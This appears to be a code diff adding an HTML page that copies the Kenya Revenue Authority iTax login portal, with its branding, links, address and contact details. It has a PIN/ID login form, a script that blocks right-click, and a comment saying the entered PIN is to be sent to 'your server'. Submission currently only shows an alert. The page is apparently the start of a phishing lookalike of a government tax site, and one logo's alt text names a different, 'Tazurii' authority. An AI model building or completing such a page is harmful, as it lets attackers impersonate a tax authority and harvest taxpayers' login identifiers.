@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>kenya Revenue Authority</title>
+<link rel="icon" type="image/png" href="images/favicon.png">
+<link rel="shortcut icon" href="favicon.ico">
+<link rel="apple-touch-icon" href="images/favicon.png">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+<style>
+  /* ===== Theme colors: change these later ===== */
+  :root{
+    --page-bg:#f2f2f2;
+    --top-bar:#ff1a1a;
+    --top-bar-text:#ffffff;
+    --header-bg:#ffffff;
+    --left-bg:#cbcbcb;
+    --right-bg:#ebebeb;
+    --login-box:#ececec;
+    --brand-red:#e30613;
+    --text:#111111;
+    --muted:#555555;
+    --link:#e30613;
+  }
+  body{overflow-x:hidden;background:var(--page-bg);font-family:Arial,Helvetica,sans-serif;color:var(--text);font-size:14px;}
+  .wrapper{width:940px;margin:0 auto;box-shadow:0 0 0 2px #fff;}
+  /* top bar */
+  .topbar{background:var(--top-bar);color:var(--top-bar-text);font-size:13px;padding:5px 4px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;}
+  .topbar a{color:var(--top-bar-text);text-decoration:underline;}
+  /* header */
+  .header{background:var(--header-bg);height:148px;display:flex;justify-content:space-between;align-items:center;padding:0 12px;overflow:hidden;}
+  /* ===== Logo slots: fixed size, so replacing an image never shifts the layout =====
+     Just overwrite the files in /images (or edit the width/height here). */
+  .slot{display:block;flex:0 0 auto;object-fit:contain;}
+  .slot-logo{width:340px;height:106px;object-position:left center;}   /* left header logo (replace images/tra-logo.png) */
+  .slot-itax{width:300px;height:126px;object-position:right center;}  /* right header logo    */
+  .slot-vision{width:150px;height:93px;object-position:left center;}  /* footer left logo     */
+  .slot-powered{width:84px;height:73px;margin:4px auto 0;}            /* footer "Powered By"  */
+  /* main */
+  .main{display:flex;flex-wrap:nowrap;position:relative;z-index:5;min-height:520px;}
+  .left{background:var(--left-bg);width:370px;padding:12px 12px 0 20px;position:relative;}
+  .mfr{position:absolute;left:20px;bottom:-26px;z-index:10;}
+  .mfr h2.sec{margin:0 0 12px;}
+  .right{background:var(--right-bg);flex:1;min-width:300px;padding:0 14px 14px 14px;}
+  h2.sec{font-size:22px;font-weight:bold;margin:12px 0;}
+  .login-head{display:flex;align-items:center;gap:10px;flex-wrap:nowrap;white-space:nowrap;margin-top:6px;}
+  .login-head h2.sec{font-size:20px;}
+  .login-head label{font-size:17px;margin:0 2px 0 0;}
+  .login-head input[type=radio]{accent-color:var(--brand-red);margin-right:4px;}
+  .loginbox{background:var(--login-box);margin:22px 0 0 0;padding:20px 14px 18px;}
+  .loginbox .row-in{display:flex;align-items:center;gap:12px;}
+  .loginbox .row-in label{font-size:14px;width:136px;margin:0;}
+  .loginbox input[type=text]{width:150px;height:26px;border:1px solid #ccc;background:#fffdf0;padding:2px 4px;}
+  .btn-continue{background:var(--brand-red);color:#fff;border:0;border-radius:14px;font-size:12px;font-weight:bold;padding:5px 15px;margin:28px 0 0 148px;}
+  .forgot{display:block;text-align:right;color:var(--link);margin-top:28px;font-size:14px;text-decoration:none;}
+  .reg-row{display:flex;gap:8px;align-items:center;margin-top:6px;}
+  /* ===== Icon slots: fixed size, replace the files in /images to change them ===== */
+  .icon{display:block;flex:0 0 auto;object-fit:contain;}
+  .icon-register{width:62px;height:66px;}
+  /* Manufacturer icon is a crop that straddles the grey panel / white footer line (boundary 32px from its top) */
+  .icon-manufacturer{width:64px;height:59px;}
+  .icon-assist{width:44px;height:44px;}
+  .reg-row .t{font-size:19px;line-height:1.1;}
+  .reg-row .s{font-size:13px;color:#333;}
+  a.ch{color:var(--muted);text-decoration:none;} a.ch:hover{color:var(--link);text-decoration:underline;}
+  .guide{text-align:right;margin-top:40px;font-size:13px;}
+  /* right services */
+  .svc-grid{display:grid;grid-template-columns:1.1fr 1.1fr 1.1fr;gap:0;margin-top:22px;}
+  .svc{padding:0 12px 14px 0;}
+  .svc h3{font-size:19px;font-weight:normal;margin:0 0 20px;line-height:1.15;}
+  .svc p{font-size:13px;margin:0;color:#222;}
+  .svc.bl{border-left:1px solid #ccc;padding-left:12px;}
+  .svc-grid2{display:grid;grid-template-columns:1fr 1fr;gap:0 24px;margin-top:20px;}
+  .svc2{margin-bottom:34px;}
+  .svc2 h3{font-size:19px;font-weight:normal;margin:0 0 6px;}
+  .svc2 p{font-size:13px;margin:0;}
+  .assist{border-top:1px solid #ccc;margin-top:6px;padding-top:12px;}
+  .assist h2{font-size:21px;font-weight:bold;margin:0 0 10px;}
+  .assist-items{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;}
+  .ai{display:flex;align-items:center;gap:8px;color:var(--muted);font-size:16px;text-decoration:none;}
+  /* footer */
+  .footer{position:relative;z-index:1;background:#fff;border:0;box-shadow:inset 0 0 0 2px #fff,inset 0 0 0 4px #ffeee7;display:flex;justify-content:space-between;align-items:center;padding:14px 18px;text-align:center;font-size:12px;line-height:1.35;flex-wrap:wrap;gap:10px;}
+  .footer .vision{font-weight:bold;text-align:left;font-size:12px;}
+  .footer .vision b{font-size:26px;color:#333;display:block;}
+  .footer .vision small{font-size:8px;font-style:italic;font-weight:normal;display:block;}
+  .footer .grey{color:#999;}
+  .powered{font-size:12px;text-align:center;}
+  #noRightClick{position:fixed;left:50%;top:20px;transform:translateX(-50%);background:#c00;color:#fff;padding:10px 22px;border-radius:6px;font-size:14px;font-weight:bold;box-shadow:0 2px 8px rgba(0,0,0,.3);z-index:9999;display:none;}
+  .err{color:#c00;font-size:12px;margin-top:4px;display:none;}
+</style>
+</head>
+<body>
+<div class="wrapper">
+
+  <!-- Top bar -->
+  <div class="topbar">
+    <div>Welcome to iTax Online Service Area</div>
+    <div>
+      <a href="#">FAQs</a> | <a href="#">Forms</a> | <a href="#">Report Problem</a> | <a href="#">Contact us</a> | <a href="#">Online Help</a> | <a href="#">iTax Videos</a>
+    </div>
+  </div>
+
+  <!-- Header with logos (replace the files in /images, same file names) -->
+  <div class="header">
+    <img class="slot slot-logo" src="images/tra-logo.png" alt="Tazurii Revenue Authority">
+    <img class="slot slot-itax" src="images/itax-logo.png" alt="iTax - Simple, Swift, Secure">
+  </div>
+
+  <!-- Main -->
+  <div class="main">
+    <!-- LEFT -->
+    <div class="left">
+      <div class="login-head">
+        <h2 class="sec m-0">Login With PIN or ID?</h2>
+        <div>
+          <label><input type="radio" name="idtype" value="PIN" checked> PIN</label>
+          <label><input type="radio" name="idtype" value="ID"> ID</label>
+        </div>
+      </div>
+
+      <form class="loginbox" id="loginForm" novalidate>
+        <div class="row-in">
+          <label for="pin">Enter PIN/User ID <span style="color:red">*</span></label>
+          <input type="text" id="pin" autocomplete="username">
+        </div>
+        <button type="submit" class="btn-continue">Continue</button>
+        <a href="https://itax.kra.go.ke/KRA-Portal/login.htm" class="forgot">Forgot Password/Unlock Account</a>
+      </form>
+
+      <h2 class="sec" style="margin-top:12px">Do you want to apply for a PIN?</h2>
+      <div class="reg-row">
+        <img class="icon icon-register" src="images/icon-register.png" alt="Register">
+        <div>
+          <div class="t">New PIN Registration</div>
+          <div class="s">To get a new PIN,<a href="https://itax.kra.go.ke/KRA-Portal/eRegIndi.htm" class="ch">Click Here</a></div>
+        </div>
+      </div>
+      <div class="guide"><a href="https://itax.kra.go.ke/KRA-Portal/main.htm?actionCode=comingSoon&viewType=static&linkFrom=LP" class="ch">Guidelines for PIN Registration</a></div>
+
+      <!-- Intentionally overlaps the footer (like the original); link stays clickable -->
+      <div class="mfr">
+        <h2 class="sec">Manufacturer Authorization</h2>
+        <div class="reg-row">
+          <img class="icon icon-manufacturer" src="images/icon-manufacturer.png" alt="Register">
+          <div>
+            <div class="t">Manufacturer Authorization</div>
+            <div class="s">To authorize manufacturer,<a href="https://itax.kra.go.ke/KRA-Portal/main.htm?actionCode=comingSoon&viewType=static&linkFrom=LP" class="ch">Click Here</a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT -->
+    <div class="right">
+      <h2 class="sec" style="margin-top:12px">iTax Online eServices</h2>
+
+      <div class="svc-grid">
+        <div class="svc">
+          <h3>PIN Checker</h3>
+          <p>To verify PIN, <a href="https://itax.kra.go.ke/KRA-Portal/pinChecker.htm?actionCode=loadPage&viewType=static" class="ch">Click Here</a></p>
+        </div>
+        <div class="svc bl">
+          <h3>TCC/Exemption/Excise License Checker</h3>
+          <p>To verify your Tax compliance/Exemption Certificate/Excise License,<a href="https://itax.kra.go.ke/KRA-Portal/complianceMonitoring.htm?actionCode=validateTCC" class="ch">Click Here</a></p>
+        </div>
+        <div class="svc bl">
+          <h3>WHT Checker</h3>
+          <p>To verify a Withholding Certificate,<a href="https://itax.kra.go.ke/KRA-Portal/complianceMonitoring.htm?actionCode=showVerifyWithholdingCertificate" class="ch">Click Here</a></p>
+        </div>
+      </div>
+
+      <div class="svc-grid2">
+        <div class="svc2">
+          <h3>Status Checker</h3>
+          <p>To consult status of your applications,<a href="https://itax.kra.go.ke/KRA-Portal/trackYrStatusController.htm?actionCode=loadPage&viewType=static" class="ch">Click Here</a></p>
+        </div>
+        <div class="svc2">
+          <h3>Agent Checker</h3>
+          <p>To verify Witholding Agent,<a href="https://itax.kra.go.ke/KRA-Portal/pinChecker.htm?actionCode=loadWthPage&viewType=static" class="ch">Click Here</a></p>
+        </div>
+        <div class="svc2">
+          <h3>Control Unit Checker</h3>
+          <p>To verify Control Unit Serial Number,<a href="https://itax.kra.go.ke/KRA-Portal/serialNumberChecker.htm?actionCode=loadPageSerialNumber&viewType=static" class="ch">Click Here</a></p>
+        </div>
+        <div class="svc2">
+          <h3>Invoice Number Checker</h3>
+          <p>To verify Control Unit Invoice Number,<a href="https://itax.kra.go.ke/KRA-Portal/invoiceNumberChecker.htm?actionCode=loadPageInvoiceNumber" class="ch">Click Here</a></p>
+        </div>
+      </div>
+
+      <div class="assist">
+        <h2>Need Assistance?</h2>
+        <div class="assist-items">
+          <a href="https://itax.kra.go.ke/KRA-Portal/main.htm?actionCode=showContactUs&viewType=static&linkFrom=LP" class="ai"><img class="icon icon-assist" src="images/icon-contact-us.png" alt="">Contact Us</a>
+          <a href="https://kenya-revenue-authority.custhelp.com/app/ask/session/L3RpbWUvMTY3NjQ1NTY3Ny9nZW4vMTY3NjQ1NTY3Ny9zaWQvZlVpTUZHbHIwbEFTUVNhWU80QzRMek9IRk9ZZyU3RW85eTglN0V0bUdlZTZrQUhwVWhYUjdRdGFsaEdBcHZ4UjJLeGh2aVNvNTNaTzlhJTdFZmJ0aVo0JTdFa2xvUlo0bmI3eUdzVUdualJqMUJybnA2bTBZVnhGOHd2VXBwcWclMjElMjE=" class="ai"><img class="icon icon-assist" src="images/icon-report-problem.png" alt=""><span>Report<br>Problem</span></a>
+          <a href="https://itax.kra.go.ke/KRA-Portal/main.htm?actionCode=showFAQ&operation=viewCategory&viewType=static" class="ai"><img class="icon icon-assist" src="images/icon-faqs.png" alt="">FAQs</a>
+          <a href="https://www.kra.go.ke/web-help/index.htm" class="ai"><img class="icon icon-assist" src="images/icon-online-help.png" alt="">Online Help</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <img class="slot slot-vision" src="images/vision-2030.png" alt="Vision">
+    <div>
+      Times Tower, Haile Selasie Avenue,<br>
+      P.O.Box 48240 - 00100 GPO Nairobi Tel: 020-310300, 020-281000 Fax: 341342<br><br>
+      Call Center details Tel:020-4999999,020-4998000 Cell:0711-099999 Email: callcentre@kra.go.ke<br>
+      <span class="grey">Site best viewed in 1024 X 768 resolution with IE 7.0 and above. &copy;2011-2026</span>
+    </div>
+    <div class="powered">
+      Powered By<br>
+      <img class="slot slot-powered" src="images/emblem.png" alt="Powered by">
+    </div>
+  </div>
+</div>
+
+<script>
+  // Scale the whole page (text, images, spacing) down when the window is narrower than the design width
+  (function(){
+    var w = document.querySelector('.wrapper'), DESIGN = 940;
+    function fit(){ var z = Math.min(1, window.innerWidth / DESIGN); w.style.zoom = z; }
+    window.addEventListener('resize', fit); fit();
+  })();
+</script>
+<script>
+  // Disable right-click and show a message
+  document.addEventListener('contextmenu', function(e){
+    e.preventDefault();
+    alert('Right-click is disabled');
+  });
+</script>
+<script>
+  // ===== PIN / ID input rules (edit the patterns below if your format changes) =====
+  var RULES = {
+    PIN: { // 1 letter + 9 digits + 1 letter, e.g. A123456789B (typed in any case, capitalised on submit)
+      maxLength: 11,
+      pattern: /^[A-Z][0-9]{9}[A-Z]$/,
+      message: 'Invalid PIN format. A PIN has 11 characters: a letter, 9 digits and a letter, e.g. A123456789B'
+    },
+    ID: { // Kenyan national ID: 7 or 8 digits
+      maxLength: 8,
+      pattern: /^[0-9]{7,8}$/,
+      message: 'Invalid ID number. An ID has 7 or 8 digits.'
+    }
+  };
+  var pinInput = document.getElementById('pin');
+
+  function currentType(){ return document.querySelector('input[name=idtype]:checked').value; }
+
+  // Filter what the user types, but keep the case as typed (small or capital letters both allowed)
+  function sanitize(){
+    var t = currentType(), v = pinInput.value;
+    if(t === 'ID'){
+      v = v.replace(/[^0-9]/g, '');                       // digits only
+    } else {
+      var out = '';                                       // position by position: letter, 9 digits, letter
+      for(var i = 0; i < v.length && out.length < 11; i++){
+        var c = v.charAt(i), n = out.length;
+        if(n === 0 && /[A-Za-z]/.test(c)) out += c;
+        else if(n >= 1 && n <= 9 && /[0-9]/.test(c)) out += c;
+        else if(n === 10 && /[A-Za-z]/.test(c)) out += c;
+      }
+      v = out;
+    }
+    pinInput.value = v.slice(0, RULES[t].maxLength);
+  }
+  pinInput.addEventListener('input', sanitize);
+  Array.prototype.forEach.call(document.querySelectorAll('input[name=idtype]'), function(r){
+    r.addEventListener('change', function(){ pinInput.value = ''; pinInput.maxLength = RULES[currentType()].maxLength; });
+  });
+  pinInput.maxLength = RULES.PIN.maxLength;
+
+  document.getElementById('loginForm').addEventListener('submit', function(e){
+    e.preventDefault();
+    var type = currentType();
+    var pin = pinInput.value.trim().toUpperCase();        // capitalise on submit
+    pinInput.value = pin;
+    if(!pin){ alert('Please enter the PIN/User ID'); pinInput.focus(); return; }
+    if(!RULES[type].pattern.test(pin)){ alert(RULES[type].message); pinInput.focus(); return; }
+    // TODO: send to your server, e.g. fetch('/api/login', {method:'POST', body: JSON.stringify({type: type, pin: pin})})
+    alert('Login with ' + type + ': ' + pin + ' (Has Been Cancelled)');
+  });
+</script>
+</body>
+</html>
